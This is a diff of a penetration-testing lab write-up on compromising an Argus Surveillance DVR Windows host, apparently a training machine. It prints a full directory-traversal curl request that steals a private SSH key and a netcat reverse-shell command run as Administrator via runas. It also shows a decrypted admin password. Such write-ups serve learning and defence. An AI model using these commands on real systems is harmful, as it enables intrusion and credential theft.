@@ -21,8 +21,7 @@ IP: 192.168.122.179
 - Found a weak password encryption script for Argus Surviellance utilizing searchsploit
 - Referencing the weak password encryption script I was able to find all but one character of the password as the script stated it did not add special characters
 - Researched the syntax to utilize to login to a program as a different user
-- Utilized the "runas" syntax to login to Admi
-- Text
+- Utilized the found "runas" syntax to login to a windows shell as Administrator
 
 ## Improved skills
 - Command for searching for hidden directories using CMD
@@ -32,7 +31,7 @@ IP: 192.168.122.179
 
 ## Used tools
 - nmap
-- 
+- runas
 
 ---
 
@@ -204,12 +203,12 @@ Enumerated top 200 UDP ports:
 
 #### - Per the NMAP scan I navigated to "http://192.168.109.179:8080" and found the following webpage:
 
-![](Pasted%20image%2020221009165921.png)
+![](Images/Pasted%20image%2020221009165921.png)
 
 
 #### - Navigated to the "Users" section and found the following user "viewer"
 
-![](Pasted%20image%2020221009183244.png)
+![](Images/Pasted%20image%2020221009183244.png)
 
 
 ---
@@ -219,33 +218,33 @@ Enumerated top 200 UDP ports:
 
 #### - Typed "searchsploit argus surveillance" and found the following exploit:
 
-![](Pasted%20image%2020221009190548.png)
+![](Images/Pasted%20image%2020221009190548.png)
 
 #### - Typed "searchsploit -m windows_x86/webapps/45296.txt" and found the following ouput showing a directory Traversal exploit:
 
-![](Pasted%20image%2020221009190910.png)
+![](Images/Pasted%20image%2020221009190910.png)
 #WindowsDirectoryTraversalExploit
 
 #### - Googled "url encoded characters" and found the following webpage showing character "." will be used as %2E and character "/" used as %2F:
 
-![](Pasted%20image%2020221009191130.png)
+![](Images/Pasted%20image%2020221009191130.png)
 
-![](Pasted%20image%2020221009191245.png)
+![](Images/Pasted%20image%2020221009191245.png)
 
-![](Pasted%20image%2020221009191343.png)
+![](Images/Pasted%20image%2020221009191343.png)
 #URLencodedCharacters
 
 #### - Typed the following on kali machine to retreive private ssh key for the found user "viewer" found previously "curl "http://[Kali IP]:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa"
 
-![](Pasted%20image%2020221009191611.png)
+![](Images/Pasted%20image%2020221009191611.png)
 #WindowsDirectoryTraversalPrivateSSHKey
 
 #### - Typed "cat id_rsa" and found the following private ssh key:
 
-![](Pasted%20image%2020221009191813.png)
+![](Images/Pasted%20image%2020221009191813.png)
 
 #### - Typed "ssh viewer@192.168.122.179 -i id_rsa" and was connected to an ssh session as user "viewer":
-![](Pasted%20image%2020221009191954.png)
+![](Images/Pasted%20image%2020221009191954.png)
 
 
 ---
@@ -255,73 +254,73 @@ Enumerated top 200 UDP ports:
 
 #### - Per the previous searchploit we ran for argus surveillance we found the following "Weak password encryption" python script:
 
-![](Pasted%20image%2020221009192206.png)
+![](Images/Pasted%20image%2020221009192206.png)
 
 #### - Typed "searchsploit -m windows/local/50130.py" to copy the python script on my kali machine
 
 #### - Typed "cat 50130.py" and found the following contents:
 
-![](Pasted%20image%2020221009192437.png)
+![](Images/Pasted%20image%2020221009192437.png)
 
 #### - Ran a privilege escalation script but couldn't find anything interesting
 
 #### - Typed "dir /a" in the C: directory to find any hidden directorys/files and found hidden directory "ProgramData"
 
-![](Pasted%20image%2020221009192857.png)
+![](Images/Pasted%20image%2020221009192857.png)
 #FindHiddenWindowsDirectorys
 
 #### - Changed to directory "ProgramData" and foud the following directorys. I then navigated into the "PY_Software" directory:
 
-![](Pasted%20image%2020221009193059.png)
+![](Images/Pasted%20image%2020221009193059.png)
 
 #### - I then found a "Argus Serveillance DVR" directory and navigated into it:
 
-![](Pasted%20image%2020221009193752.png)
+![](Images/Pasted%20image%2020221009193752.png)
 
 #### - I then found the DVRParams (.ini) configuration file:
 
-![](Pasted%20image%2020221009194221.png)
+![](Images/Pasted%20image%2020221009194221.png)
 #WindowsProgramConfigurationFile 
 
 #### - I then typed "type DVRParams.ini" to read the contents of the configuration file and found the following "adminstrator" user and hashed or encrypted password "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8":
-![](Pasted%20image%2020221009201025.png)
+![](Images/Pasted%20image%2020221009201025.png)
 
 #### - Attempted to type "hashid ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8" to identify the hash but received an Uknown hash:
 
-![](Pasted%20image%2020221009201200.png)
+![](Images/Pasted%20image%2020221009201200.png)
 	#IdentifyHashID
 
 #### - Remembered the "Weak password encryption" exploit/script found earlier. Typed "vim 50130.py" and input the encrypted password into the script:
 
-![](Pasted%20image%2020221009201411.png)
+![](Images/Pasted%20image%2020221009201411.png)
 
 #### - Typed "python 50130.py" to run the script and found the mostly decrypted password to be "14WatchD0g". Although the script is unable to decode the last string of characters:
 
-![](Pasted%20image%2020221009201544.png)
+![](Images/Pasted%20image%2020221009201544.png)
 
 #### - Reading through the script we find the coder of the script was "too lazy to add special characters":
 
-![](Pasted%20image%2020221009201710.png)
+![](Images/Pasted%20image%2020221009201710.png)
 
 #### - Navigated to the viewer users directory and found the netcat executable was installed:
 
-![](Pasted%20image%2020221009202007.png)
+![](Images/Pasted%20image%2020221009202007.png)
 
 #### - Setup a netcat listener to listen on port 443 
 
 #### -As we are going to attempt to login as a different user (Administrator) I googled "how to run a program as a different user in windows command line" :
 
-![](Pasted%20image%2020221009202220.png)
+![](Images/Pasted%20image%2020221009202220.png)
 
 #### - Per the web page it showed to run the following command example "runas /user:admin "C:\Windows\notepad.exe"
 
-![](Pasted%20image%2020221009202314.png)
+![](Images/Pasted%20image%2020221009202314.png)
 
 #### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:
 
-![](Pasted%20image%2020221009202519.png)
+![](Images/Pasted%20image%2020221009202519.png)
 
-![](Pasted%20image%2020221009202604.png)
+![](Images/Pasted%20image%2020221009202604.png)
 #RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation
 
 
@@ -330,9 +329,9 @@ Enumerated top 200 UDP ports:
 
 #### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:
 
-![](Pasted%20image%2020221009202519.png)
+![](Images/Pasted%20image%2020221009202519.png)
 
-![](Pasted%20image%2020221009202604.png)
+![](Images/Pasted%20image%2020221009202604.png)
 
 
 #RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation
